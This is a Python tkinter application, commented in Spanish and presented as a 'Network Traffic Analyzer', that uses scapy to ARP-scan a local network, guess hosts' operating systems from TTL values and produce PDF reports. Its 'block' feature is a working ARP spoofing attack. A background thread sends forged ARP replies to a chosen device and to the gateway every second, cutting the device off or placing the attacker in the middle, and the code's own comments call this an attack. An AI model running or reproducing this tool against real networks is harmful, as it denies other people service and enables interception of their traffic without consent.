import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
from scapy.all import *
import threading
import time
import platform
import os
import sys
import ctypes
from datetime import datetime
from reportlab.lib import colors
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph
from reportlab.lib.styles import getSampleStyleSheet
import json

class NetworkAnalyzer:
    def __init__(self):
        # Configuración inicial
        self.gateway_ip = self.get_default_gateway()
        self.network_interface = conf.iface
        self.network_range = self.get_network_range()
        self.devices = []  # Lista de dispositivos detectados
        self.blocked_devices = []  # Lista de dispositivos bloqueados
        self.is_scanning = False
        self.attack_threads = {}

    def get_default_gateway(self):
        """Obtiene la IP del gateway por defecto"""
        try:
            gateways = conf.route.route("0.0.0.0")[2]
            return gateways if gateways != "0.0.0.0" else "192.168.1.1"
        except:
            return "192.168.1.1"

    def get_network_range(self):
        """Obtiene el rango de red basado en la interfaz activa"""
        try:
            for net, msk, gw, iface, addr, metric in conf.route.routes:
                if gw != '0.0.0.0' and addr != '0.0.0.0':
                    network = addr + "/" + str(bin(int(msk.replace(".", ""), 2)).count("1"))
                    return network
            return "192.168.1.0/24"  # Red por defecto si no se puede determinar
        except:
            return "192.168.1.0/24"

    def get_os_by_ttl(self, ttl):
        """Determina el sistema operativo basado en el TTL"""
        if ttl >= 0 and ttl <= 64:
            return "Linux/Unix"
        elif ttl >= 65 and ttl <= 128:
            return "Windows"
        elif ttl >= 129 and ttl <= 255:
            return "Cisco/Network Device"
        return "Unknown"

    def scan_network(self):
        """Escanea la red en busca de dispositivos"""
        try:
            self.is_scanning = True
            # ARP scan para encontrar dispositivos
            ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=self.network_range), 
                           timeout=2, verbose=False)
            
            current_devices = []
            for send, rcv in ans:
                try:
                    # ICMP echo request para obtener TTL
                    icmp_resp = sr1(IP(dst=rcv.psrc)/ICMP(), timeout=1, verbose=False)
                    ttl = icmp_resp[IP].ttl if icmp_resp else 0
                    
                    device = {
                        'ip': rcv.psrc,
                        'mac': rcv.hwsrc,
                        'ttl': ttl,
                        'os': self.get_os_by_ttl(ttl),
                        'last_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        'is_blocked': False
                    }
                    
                    # No incluir el gateway en la lista
                    if device['ip'] != self.gateway_ip:
                        current_devices.append(device)
                except:
                    continue

            self.devices = current_devices
            return True
        except Exception as e:
            print(f"Error en escaneo: {e}")
            return False
        finally:
            self.is_scanning = False

    def block_device(self, device):
        """Bloquea un dispositivo de la red"""
        try:
            if device in self.blocked_devices:
                return False

            # Iniciar el ataque ARP spoofing
            attack_thread = threading.Thread(
                target=self._arp_spoof_attack,
                args=(device['ip'], device['mac']),
                daemon=True
            )
            self.attack_threads[device['ip']] = {
                'thread': attack_thread,
                'running': True
            }
            attack_thread.start()

            device['is_blocked'] = True
            self.blocked_devices.append(device)
            return True
        except Exception as e:
            print(f"Error al bloquear dispositivo: {e}")
            return False

    def unblock_device(self, device):
        """Desbloquea un dispositivo de la red"""
        try:
            if device not in self.blocked_devices:
                return False

            # Detener el ataque
            if device['ip'] in self.attack_threads:
                self.attack_threads[device['ip']]['running'] = False
                del self.attack_threads[device['ip']]

            # Restaurar ARP tables
            self._restore_arp(device['ip'], device['mac'])
            
            device['is_blocked'] = False
            self.blocked_devices.remove(device)
            return True
        except Exception as e:
            print(f"Error al desbloquear dispositivo: {e}")
            return False

    def _arp_spoof_attack(self, target_ip, target_mac):
        """Realiza el ataque ARP spoofing"""
        gateway_mac = getmacbyip(self.gateway_ip)
        if not gateway_mac:
            return

        while self.attack_threads.get(target_ip, {}).get('running', False):
            try:
                # Enviar ARP spoof al objetivo
                send(ARP(
                    op=2,
                    pdst=target_ip,
                    hwdst=target_mac,
                    psrc=self.gateway_ip,
                    hwsrc=get_if_hwaddr(conf.iface)
                ), verbose=False)

                # Enviar ARP spoof al gateway
                send(ARP(
                    op=2,
                    pdst=self.gateway_ip,
                    hwdst=gateway_mac,
                    psrc=target_ip,
                    hwsrc=get_if_hwaddr(conf.iface)
                ), verbose=False)

                time.sleep(1)
            except:
                continue

    def _restore_arp(self, target_ip, target_mac):
        """Restaura las tablas ARP"""
        gateway_mac = getmacbyip(self.gateway_ip)
        if not gateway_mac:
            return

        try:
            # Restaurar ARP en el objetivo
            send(ARP(
                op=2,
                pdst=target_ip,
                hwdst=target_mac,
                psrc=self.gateway_ip,
                hwsrc=gateway_mac
            ), count=5, verbose=False)

            # Restaurar ARP en el gateway
            send(ARP(
                op=2,
                pdst=self.gateway_ip,
                hwdst=gateway_mac,
                psrc=target_ip,
                hwsrc=target_mac
            ), count=5, verbose=False)
        except:
            pass

    def generate_report(self, filename="network_report.pdf"):
        """Genera un reporte PDF de los dispositivos"""
        try:
            doc = SimpleDocTemplate(filename, pagesize=letter)
            elements = []
            styles = getSampleStyleSheet()

            # Título
            elements.append(Paragraph("Network Analysis Report", styles['Title']))
            elements.append(Paragraph(f"Generated on: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", 
                                   styles['Normal']))
            elements.append(Paragraph("<br/><br/>", styles['Normal']))

            # Tabla de dispositivos activos
            elements.append(Paragraph("Active Devices", styles['Heading1']))
            if self.devices:
                data = [['IP Address', 'MAC Address', 'TTL', 'Operating System', 'Last Seen']]
                for device in self.devices:
                    data.append([
                        device['ip'],
                        device['mac'],
                        str(device['ttl']),
                        device['os'],
                        device['last_seen']
                    ])
                
                table = Table(data)
                table.setStyle(TableStyle([
                    ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
                    ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                    ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                    ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                    ('FONTSIZE', (0, 0), (-1, 0), 14),
                    ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                    ('TEXTCOLOR', (0, 1), (-1, -1), colors.black),
                    ('FONTNAME', (0, 1), (-1, -1), 'Helvetica'),
                    ('FONTSIZE', (0, 1), (-1, -1), 12),
                    ('GRID', (0, 0), (-1, -1), 1, colors.black),
                    ('BOX', (0, 0), (-1, -1), 2, colors.black),
                    ('LINEBELOW', (0, 0), (-1, 0), 2, colors.black),
                ]))
                elements.append(table)

            # Tabla de dispositivos bloqueados
            elements.append(Paragraph("<br/><br/>Blocked Devices", styles['Heading1']))
            if self.blocked_devices:
                data = [['IP Address', 'MAC Address', 'Operating System', 'Blocked Since']]
                for device in self.blocked_devices:
                    data.append([
                        device['ip'],
                        device['mac'],
                        device['os'],
                        device['last_seen']
                    ])
                
                table = Table(data)
                table.setStyle(TableStyle([
                    ('BACKGROUND', (0, 0), (-1, 0), colors.red),
                    ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                    ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                    ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                    ('FONTSIZE', (0, 0), (-1, 0), 14),
                    ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                    ('TEXTCOLOR', (0, 1), (-1, -1), colors.black),
                    ('FONTNAME', (0, 1), (-1, -1), 'Helvetica'),
                    ('FONTSIZE', (0, 1), (-1, -1), 12),
                    ('GRID', (0, 0), (-1, -1), 1, colors.black),
                    ('BOX', (0, 0), (-1, -1), 2, colors.black),
                    ('LINEBELOW', (0, 0), (-1, 0), 2, colors.black),
                ]))
                elements.append(table)

            doc.build(elements)
            return True
        except Exception as e:
            print(f"Error generando reporte: {e}")
            return False
        
class NetworkAnalyzerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Network Traffic Analyzer")
        self.root.geometry("1000x700")
        self.analyzer = NetworkAnalyzer()
        self.setup_gui()
        self.start_auto_scan()

    def setup_gui(self):
        # Configuración del estilo
        style = ttk.Style()
        style.theme_use('clam')
        
        # Frame principal
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_frame.columnconfigure(0, weight=1)
        main_frame.columnconfigure(1, weight=1)
        main_frame.rowconfigure(1, weight=1)
        
        # Controles superiores
        controls_frame = ttk.Frame(main_frame)
        controls_frame.grid(row=0, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=5)
        
        ttk.Button(controls_frame, text="Scan Network", 
                  command=self.manual_scan).grid(row=0, column=0, padx=5)
        ttk.Button(controls_frame, text="Generate Report", 
                  command=self.generate_report).grid(row=0, column=1, padx=5)
        
        # Frame izquierdo para dispositivos detectados
        left_frame = ttk.LabelFrame(main_frame, text="Detected Devices", padding="5")
        left_frame.grid(row=1, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), padx=5)
        left_frame.columnconfigure(0, weight=1)
        left_frame.rowconfigure(0, weight=1)
        
        # Treeview para dispositivos detectados
        columns = ('ip', 'mac', 'ttl', 'os', 'last_seen')
        self.devices_tree = ttk.Treeview(left_frame, columns=columns, show='headings')
        
        # Configurar columnas
        self.devices_tree.heading('ip', text='IP Address')
        self.devices_tree.heading('mac', text='MAC Address')
        self.devices_tree.heading('ttl', text='TTL')
        self.devices_tree.heading('os', text='OS')
        self.devices_tree.heading('last_seen', text='Last Seen')
        
        # Ajustar anchos de columna
        for col in columns:
            self.devices_tree.column(col, width=100)
        
        # Scrollbars para dispositivos detectados
        y_scroll = ttk.Scrollbar(left_frame, orient=tk.VERTICAL, command=self.devices_tree.yview)
        x_scroll = ttk.Scrollbar(left_frame, orient=tk.HORIZONTAL, command=self.devices_tree.xview)
        self.devices_tree.configure(yscrollcommand=y_scroll.set, xscrollcommand=x_scroll.set)
        
        # Grid para el árbol y scrollbars
        self.devices_tree.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        y_scroll.grid(row=0, column=1, sticky=(tk.N, tk.S))
        x_scroll.grid(row=1, column=0, sticky=(tk.W, tk.E))
        
        # Botones de acción para dispositivos detectados
        actions_frame = ttk.Frame(left_frame)
        actions_frame.grid(row=2, column=0, columnspan=2, pady=5)
        ttk.Button(actions_frame, text="Block Selected", 
                  command=self.block_selected).pack(side=tk.LEFT, padx=5)
        
        # Frame derecho para dispositivos bloqueados
        right_frame = ttk.LabelFrame(main_frame, text="Blocked Devices", padding="5")
        right_frame.grid(row=1, column=1, sticky=(tk.W, tk.E, tk.N, tk.S), padx=5)
        right_frame.columnconfigure(0, weight=1)
        right_frame.rowconfigure(0, weight=1)
        
        # Treeview para dispositivos bloqueados
        self.blocked_tree = ttk.Treeview(right_frame, columns=columns, show='headings')
        for col in columns:
            self.blocked_tree.heading(col, text=self.devices_tree.heading(col)['text'])
            self.blocked_tree.column(col, width=100)
        
        # Scrollbars para dispositivos bloqueados
        y_scroll_blocked = ttk.Scrollbar(right_frame, orient=tk.VERTICAL, 
                                       command=self.blocked_tree.yview)
        x_scroll_blocked = ttk.Scrollbar(right_frame, orient=tk.HORIZONTAL, 
                                       command=self.blocked_tree.xview)
        self.blocked_tree.configure(yscrollcommand=y_scroll_blocked.set, 
                                  xscrollcommand=x_scroll_blocked.set)
        
        # Grid para el árbol y scrollbars bloqueados
        self.blocked_tree.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        y_scroll_blocked.grid(row=0, column=1, sticky=(tk.N, tk.S))
        x_scroll_blocked.grid(row=1, column=0, sticky=(tk.W, tk.E))
        
        # Botones de acción para dispositivos bloqueados
        blocked_actions = ttk.Frame(right_frame)
        blocked_actions.grid(row=2, column=0, columnspan=2, pady=5)
        ttk.Button(blocked_actions, text="Unblock Selected", 
                  command=self.unblock_selected).pack(side=tk.LEFT, padx=5)
        
        # Frame inferior para logs
        log_frame = ttk.LabelFrame(main_frame, text="Activity Log", padding="5")
        log_frame.grid(row=2, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=5)
        log_frame.columnconfigure(0, weight=1)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, height=8)
        self.log_text.grid(row=0, column=0, sticky=(tk.W, tk.E))
        
        # Status bar
        self.status_var = tk.StringVar()
        self.status_var.set("Ready")
        status_bar = ttk.Label(main_frame, textvariable=self.status_var, relief=tk.SUNKEN)
        status_bar.grid(row=3, column=0, columnspan=2, sticky=(tk.W, tk.E))

    def manual_scan(self):
        """Realiza un escaneo manual de la red"""
        self.status_var.set("Scanning network...")
        self.log("Iniciando escaneo manual...")
        
        def scan():
            if self.analyzer.scan_network():
                self.root.after(0, self.update_devices_list)
                self.log("Escaneo completado exitosamente")
                self.status_var.set("Scan completed")
            else:
                self.log("Error durante el escaneo")
                self.status_var.set("Scan failed")
        
        threading.Thread(target=scan, daemon=True).start()

    def start_auto_scan(self):
        """Inicia el escaneo automático en segundo plano"""
        def auto_scan():
            while True:
                if not self.analyzer.is_scanning:
                    if self.analyzer.scan_network():
                        self.root.after(0, self.update_devices_list)
                time.sleep(30)  # Escanear cada 30 segundos
        
        threading.Thread(target=auto_scan, daemon=True).start()

    def update_devices_list(self):
        """Actualiza las listas de dispositivos en la GUI"""
        # Limpiar árboles
        for item in self.devices_tree.get_children():
            self.devices_tree.delete(item)
        for item in self.blocked_tree.get_children():
            self.blocked_tree.delete(item)
            
        # Actualizar dispositivos detectados
        for device in self.analyzer.devices:
            self.devices_tree.insert('', tk.END, values=(
                device['ip'],
                device['mac'],
                device['ttl'],
                device['os'],
                device['last_seen']
            ))
            
        # Actualizar dispositivos bloqueados
        for device in self.analyzer.blocked_devices:
            self.blocked_tree.insert('', tk.END, values=(
                device['ip'],
                device['mac'],
                device['ttl'],
                device['os'],
                device['last_seen']
            ))

    def block_selected(self):
        """Bloquea el dispositivo seleccionado"""
        selection = self.devices_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a device to block")
            return
            
        item = self.devices_tree.item(selection[0])
        device_ip = item['values'][0]
        device = next((d for d in self.analyzer.devices if d['ip'] == device_ip), None)
        
        if device and self.analyzer.block_device(device):
            self.log(f"Dispositivo bloqueado: {device_ip}")
            self.update_devices_list()
        else:
            self.log(f"Error al bloquear dispositivo: {device_ip}")

    def unblock_selected(self):
        """Desbloquea el dispositivo seleccionado"""
        selection = self.blocked_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a device to unblock")
            return
            
        item = self.blocked_tree.item(selection[0])
        device_ip = item['values'][0]
        device = next((d for d in self.analyzer.blocked_devices if d['ip'] == device_ip), None)
        
        if device and self.analyzer.unblock_device(device):
            self.log(f"Dispositivo desbloqueado: {device_ip}")
            self.update_devices_list()
        else:
            self.log(f"Error al desbloquear dispositivo: {device_ip}")

    def generate_report(self):
        """Genera el reporte PDF"""
        filename = f"network_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"
        if self.analyzer.generate_report(filename):
            self.log(f"Reporte generado exitosamente: {filename}")
            messagebox.showinfo("Success", f"Report generated: {filename}")
        else:
            self.log("Error al generar el reporte")
            messagebox.showerror("Error", "Failed to generate report")

    def log(self, message):
        """Agrega un mensaje al área de logs"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.log_text.insert(tk.END, f"[{timestamp}] {message}\n")
        self.log_text.see(tk.END)

def main():
    try:
        # Verificar privilegios de administrador
        if platform.system().lower() == "windows":
            if not ctypes.windll.shell32.IsUserAnAdmin():
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, 
                                                  ' '.join(sys.argv), None, 1)
                sys.exit()
        else:
            if os.geteuid() != 0:
                messagebox.showerror("Error", "This program requires root privileges")
                sys.exit()

        root = tk.Tk()
        app = NetworkAnalyzerGUI(root)
        root.mainloop()
    except Exception as e:
        messagebox.showerror("Error", f"Application error: {str(e)}")

if __name__ == "__main__":
    main()